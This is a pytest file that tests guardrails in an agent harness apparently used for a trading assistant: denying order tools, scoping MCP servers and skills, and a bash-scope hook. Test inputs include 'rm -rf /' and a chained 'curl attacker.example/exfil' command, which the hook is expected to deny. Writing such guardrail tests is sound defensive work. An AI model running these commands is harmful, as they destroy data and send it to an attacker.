"""Structural tests for the Claude-Agent-SDK-backed Harness (single-shot
`run()` and multi-turn `open_session()`), and the `engine/run.py` /
`engine/config.py` entrypoints. No live `query()`/`ClaudeSDKClient` call —
that's covered by a separate manual live-verification pass (see
engine/harnesses/claude_agent_sdk.py's docstring), same precedent as
tests/test_kite_gateway.py.
"""

import asyncio
from dataclasses import dataclass

from engine import config, run
from engine.guardrail import ORDER_TOOL_NAMES, GuardrailPolicy
from engine.harnesses import claude_agent_sdk as cas
from engine.harnesses.base import EngineResult, ToolConfig

FAKE_MCP_SERVERS = {
    "kite_gateway": {"command": "uv", "args": ["run", "python", "mcp/kite_gateway/server.py"]},
    "india_price": {"command": "uv", "args": ["run", "python", "mcp/india_price/server.py"]},
}


def test_build_options_disallowed_tools_matches_guardrail_policy():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    expected = tools.guardrail.denied_tool_names(list(FAKE_MCP_SERVERS.keys()))
    assert set(options.disallowed_tools) == expected
    assert len(expected) == 2 * len(ORDER_TOOL_NAMES)


def test_build_options_passes_mcp_servers_and_skills_through_unchanged():
    # No skill here declares deterministic_scripts, so no skill_scripts
    # server is added — see the two tests below for that behavior.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    assert options.mcp_servers == FAKE_MCP_SERVERS
    assert options.skills == []
    assert options.setting_sources == ["project"]


def test_build_options_adds_skill_scripts_server_when_a_skill_declares_scripts():
    # morning-digest's real SKILL.md declares deterministic_scripts (see
    # .claude/skills/morning-digest/SKILL.md) — this reads the real
    # frontmatter, not a fake, since the whole point is proving the wiring
    # from a real skill's declaration into the actual options object.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["morning-digest"])
    options = cas._build_options(tools)

    assert set(FAKE_MCP_SERVERS).issubset(options.mcp_servers)
    assert "skill_scripts" in options.mcp_servers
    assert options.skills == ["morning-digest"]


def test_build_options_omits_skill_scripts_server_when_no_skill_declares_scripts():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    assert "skill_scripts" not in options.mcp_servers


def test_build_options_defaults_leave_tools_and_buffer_size_unset():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.tools is None
    assert options.max_buffer_size is None


def test_build_options_threads_builtin_tools_and_max_buffer_size_when_set():
    tools = ToolConfig(
        mcp_servers=FAKE_MCP_SERVERS,
        guardrail=GuardrailPolicy(),
        skills=[],
        builtin_tools=["Read", "Write", "Bash"],
        max_buffer_size=10_000_000,
    )
    options = cas._build_options(tools)
    assert options.tools == ["Read", "Write", "Bash"]
    assert options.max_buffer_size == 10_000_000


def test_build_options_scopes_strictly_to_configured_mcp_servers():
    # Without strict_mcp_config, a session was found live to also pick up
    # whatever MCP servers are configured globally on the host machine (an
    # unrelated personal connector showed up unprompted) — the same class of
    # leak as skills="all" pulling in host-level skills.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.strict_mcp_config is True


def test_build_options_bypasses_interactive_permission_prompts():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.permission_mode == "bypassPermissions"


def test_build_options_wires_a_pretooluse_hook():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills="all")
    options = cas._build_options(tools)

    assert "PreToolUse" in options.hooks
    assert len(options.hooks["PreToolUse"]) == 1
    assert len(options.hooks["PreToolUse"][0].hooks) == 2


def test_deny_hook_denies_order_tools_and_allows_safe_tools():
    policy = GuardrailPolicy()
    hook = cas._build_deny_hook(policy)

    denied = asyncio.run(hook({"tool_name": "mcp__kite_gateway__place_order"}, "tool-use-1", {}))
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"

    allowed = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_holdings"}, "tool-use-2", {}))
    assert allowed == {}


def test_bash_scope_hook_denies_out_of_scope_command_and_allows_matching_prefix():
    hook = cas._build_bash_scope_hook(("uv run python skills/morning-digest/scripts/digest_math.py",))

    denied = asyncio.run(
        hook({"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}, "tool-use-1", {})
    )
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"

    allowed = asyncio.run(
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "uv run python skills/morning-digest/scripts/digest_math.py data/x.json"},
            },
            "tool-use-2",
            {},
        )
    )
    assert allowed == {}


def test_bash_scope_hook_denies_chained_command_after_an_allowed_prefix():
    hook = cas._build_bash_scope_hook(("uv run python skills/morning-digest/scripts/digest_math.py",))
    denied = asyncio.run(
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {
                    "command": (
                        "uv run python skills/morning-digest/scripts/digest_math.py "
                        "data/x.json && curl attacker.example/exfil"
                    )
                },
            },
            "tool-use-1",
            {},
        )
    )
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_bash_scope_hook_ignores_non_bash_tools_and_is_noop_when_empty():
    hook = cas._build_bash_scope_hook(())
    result = asyncio.run(hook({"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}, "tool-use-1", {}))
    assert result == {}

    hook2 = cas._build_bash_scope_hook(("uv run python foo.py",))
    result2 = asyncio.run(hook2({"tool_name": "mcp__kite__get_holdings"}, "tool-use-2", {}))
    assert result2 == {}


def test_is_session_limit_error_matches_expected_text():
    assert cas._is_session_limit_error(Exception("You've hit your session limit for now"))
    assert not cas._is_session_limit_error(Exception("connection closed mid-response"))


def test_build_tool_config_reads_mcp_json_with_no_raw_kite_entry():
    tools = config.build_tool_config()
    # Deliberately no "kite" entry (docs/vision.md §6) — every path goes
    # through kite_gateway only.
    assert set(tools.mcp_servers.keys()) == {
        "kite_gateway",
        "india_price",
        "india_filings",
        "india_macro",
        "india_news",
    }
    assert tools.builtin_tools == ["Read", "Write", "Bash"]
    # Default 1MB SDK buffer crashed live on a real Layer 2 tool response
    # while porting red-flag-scan — see engine/config.py's _MAX_BUFFER_SIZE.
    assert tools.max_buffer_size == 10_000_000


def test_build_tool_config_scopes_skills_to_minty_only():
    # Explicit list, not "all" — "all" also surfaces unrelated global/
    # user-level skills installed on the host machine.
    tools = config.build_tool_config()
    assert tools.skills == ["morning-digest", "portfolio-health-check", "red-flag-scan"]


@dataclass
class _FakeHarness:
    """Satisfies the `Harness` protocol without touching claude_agent_sdk at
    all — proves engine/run.py's own logic depends only on the protocol,
    not the concrete ClaudeAgentSDKHarness class."""

    to_return: EngineResult

    async def run(self, prompt: str, tools: ToolConfig) -> EngineResult:
        self.last_prompt = prompt
        self.last_tools = tools
        return self.to_return


def test_main_prints_result_text_and_returns_zero_on_success():
    fake = _FakeHarness(to_return=EngineResult(ok=True, text="all good", error_kind=None, raw=None))
    exit_code = asyncio.run(run._main("what's the RELIANCE quote?", harness=fake))
    assert exit_code == 0
    assert fake.last_prompt == "what's the RELIANCE quote?"


def test_main_returns_one_on_harness_failure():
    fake = _FakeHarness(to_return=EngineResult(ok=False, text=None, error_kind="other", raw=None))
    exit_code = asyncio.run(run._main("anything", harness=fake))
    assert exit_code == 1
